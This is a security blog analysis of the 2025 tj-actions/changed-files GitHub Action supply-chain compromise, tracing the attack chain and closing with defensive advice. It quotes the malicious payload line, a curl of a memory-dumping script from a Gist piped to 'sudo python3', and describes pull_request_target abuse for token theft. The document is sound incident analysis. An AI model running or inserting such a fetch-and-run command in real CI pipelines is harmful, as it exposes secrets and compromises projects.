---
title: "When a GitHub Action rewrites its own history"
date: 2025-03-17T12:00:00+00:00
draft: false
tags:
  - security
  - supply-chain
  - GitHub
  - open-source
  - ci-cd
  - vulnerability
categories:
  - Security
  - Threat Intelligence
coverImage: /images/tj-actions-supply-chain-attack/article-arxiv-cicd-pipeline-attack-surfaces.png
description: "A compromised GitHub Action silently rewrote every version tag to point at a single malicious commit - exposing secrets across 23,000 repositories in the process."
tier: free
contentType: research
author: Lewis
keyFindings:
  - "All version tags of tj-actions/changed-files were retroactively redirected to a single malicious commit that dumped CI runner memory and logged secrets in plaintext."
  - "The attack chain originated in a SpotBugs repository exploit in November 2024 and cascaded through reviewdog before reaching tj-actions - a supply chain compromise spanning four months and three projects."
  - "StepSecurity's Harden-Runner detected the compromise through an anomalous outbound network call to gist.githubusercontent.com before any public disclosure."
  - "Academic research across 320,000 repositories found that 83.56% of GitHub Actions usages reference outdated versions and 25.76% of repositories pass at least one credential into their CI/CD pipelines."
  - "The ultimate target appears to have been Coinbase's agentkit repository - but the attack was detected before any secrets were successfully exfiltrated."
artifacts:
  - type: reference
    url: https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/
    description: "Unit 42 - Full investigation tracing the attack chain from SpotBugs through reviewdog to tj-actions"
  - type: reference
    url: https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
    description: "Wiz Research - CVE-2025-30066 supply chain attack overview and impact analysis"
  - type: reference
    url: https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
    description: "StepSecurity - Initial detection of the tj-actions/changed-files compromise via Harden-Runner"
  - type: reference
    url: https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/
    description: "Semgrep - Detection rules and analysis of the compromised GitHub Action"
  - type: reference
    url: https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
    description: "GitHub Advisory Database - CVE-2025-30066 advisory for tj-actions/changed-files"
  - type: reference
    url: https://arxiv.org/abs/2401.17606
    description: "Pan et al. - Ambush from All Sides: Understanding Security Threats in Open-Source Software CI/CD Pipelines (IEEE TDSC 2024)"
---

On 14 March 2025, every version tag of the GitHub Action `tj-actions/changed-files` - from v1.0.0 through v45.0.7 - was silently redirected to a single malicious commit. The commit dumped CI runner process memory, extracted secrets and logged them as double-encoded base64 in workflow output. Over 23,000 repositories used this action. Anyone who ran a workflow that weekend had their secrets written to their build logs.

The CI/CD ecosystem runs on trust in third-party actions, and the mechanisms that support that trust - version tags, verified creators, marketplace listings - turned out to be easier to subvert than most people assumed.

## What the payload did

The malicious commit downloaded a Python script from a GitHub Gist and executed it with elevated privileges:

```bash
B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3`
```

The script targeted the Runner Worker process, scanning its memory for anything resembling a secret - API keys, tokens, credentials - then base64-encoded the output twice and printed it to the workflow log. No data was sent to an external server. The secrets sat in the logs, readable by anyone with access to the repository's workflow runs.

Wiz Research confirmed that no external exfiltration endpoint was observed. The attacker's approach was subtler: harvest secrets from publicly accessible log output rather than route them through a server that network monitoring might flag.

StepSecurity was the first to spot the compromise. Their Harden-Runner tool flagged an anomalous outbound network call to `gist.githubusercontent.com` during a CI run - a domain that has no business appearing in the network profile of a file-change detection action. That single detection triggered the investigation that led to public disclosure.

## The tag override problem

The compromise worked because Git tags are mutable. When a repository maintainer pins their workflow to `tj-actions/changed-files@v44`, they're trusting that the tag `v44` still points to the same commit it did when they configured it. That assumption was wrong.

The attacker overwrote every existing tag to point at commit `0e58ed8`. Semgrep verified this by running `git tag --points-at 0e58ed8671d6b60d0890c21b07f8835ace038e67`, which returned the full tag history - every version, from the earliest release to the latest, now resolved to the malicious payload.

The GitHub Advisory (GHSA-mrrh-fwg8-r2c3) assigned CVE-2025-30066 with a CVSS score of 8.6. CISA issued its own alert on 18 March 2025, adding it to the Known Exploited Vulnerabilities catalogue. The vulnerability affected all versions through 45.0.7 and was patched in v46.0.1.

This was not even the first security issue in `tj-actions/changed-files`. Semgrep's analysis noted a prior vulnerability - CVE-2023-51664 - in the same action. A pattern of recurring issues in something that 23,000 repositories depended on for their build pipelines.

## The deeper chain

Unit 42's investigation revealed something more concerning than a single compromised action. The attack on `tj-actions/changed-files` was the final link in a chain that stretched back four months and across three separate projects.

It started in November 2024 with a `pull_request_target` exploit against `spotbugs/sonar-findbugs` - a SpotBugs community repository. The `pull_request_target` trigger runs workflow code in the context of the base repository rather than the fork, meaning a malicious pull request can access the target repository's secrets. The attacker used this to obtain a personal access token belonging to a SpotBugs maintainer.

From SpotBugs, the attacker pivoted to `reviewdog` - another widely-used project in the GitHub Actions ecosystem. Using the stolen token and a series of dummy accounts (Unit 42 identified three: `iLrmKCu86tjwp8`, `2ft2dKo28UazTZ` and `mmvojwip`), they compromised `reviewdog/action-setup`, which was later assigned CVE-2025-30154. The reviewdog compromise gave them the foothold they needed to reach tj-actions.

The final target was not tj-actions itself. Unit 42's analysis pointed to Coinbase's `agentkit` repository - a project that used `tj-actions/changed-files` in its CI pipeline. The entire four-month operation appears to have been engineered to reach a single high-value target through its build dependencies.

It didn't work. The attack was detected before Coinbase's secrets were exfiltrated. But the path the attacker took - SpotBugs to reviewdog to tj-actions to Coinbase - is a textbook illustration of how supply chain attacks traverse trust boundaries that defenders rarely map.

## What the research already told us

The attack validated findings that academic researchers had been publishing for months. Pan et al.'s large-scale study of CI/CD pipeline security - published in IEEE Transactions on Dependable and Secure Computing in 2024 - measured over 320,000 GitHub repositories with configured CI/CD pipelines. Their findings read like a pre-written risk assessment for exactly this type of incident.

They found that 94.65% of CI/CD-configured repositories used `actions/checkout` - a single action touching nearly every pipeline on the platform. The ecosystem's dependency on a handful of core actions creates what they described as a single point of failure. Compromise one popular action and the blast radius is enormous.

![Top 10 most popular CI/CD scripts and their influence across repositories, from Pan et al.](/images/tj-actions-supply-chain-attack/other-arxiv-popular-cicd-scripts.png)

![Distribution of repositories passing credentials into CI/CD pipelines, from Pan et al.](/images/tj-actions-supply-chain-attack/other-arxiv-credential-usage.png)

More directly relevant: Pan et al. measured that 25.76% of repositories pass at least one credential into their CI/CD pipelines, and the average update lag for action version references was 11.04 months. That means when a vulnerability is patched, most repositories don't update their pipeline configurations for nearly a year. 83.56% of action usages referenced outdated versions. The conditions that enabled the tj-actions attack - stale version pins, credential exposure and concentrated dependency on popular actions - were already documented in the academic literature.

They also noted that 94.93% of repositories referenced actions by tag rather than by commit SHA. Pinning to a tag feels safe. It isn't. Tags can be moved. Only commit SHA pinning is immutable.

## What this changes

The standard advice after incidents like this is to pin actions to full commit SHAs rather than version tags. That advice is correct and has been repeated across the supply chain security conversation for years. The tj-actions incident is evidence that it hasn't been widely adopted.

GitHub's own documentation recommends SHA pinning for third-party actions. Semgrep published detection rules specifically to identify `tj-actions/changed-files` usage in workflows. StepSecurity's Harden-Runner showed that runtime anomaly detection can catch compromises that static analysis misses entirely.

But the structural problem sits underneath the tooling. The CI/CD ecosystem imports executable code from actions maintained by individuals with no security budget. SpotBugs, reviewdog and tj-actions were all community-maintained projects. None had the security resources of the organisations that depended on them. The trust model assumes that a version tag is a sufficient security control. The tj-actions compromise showed that it isn't - and that mutable tags, stolen tokens and stale version pins are enough to traverse three projects and reach a target four months later.
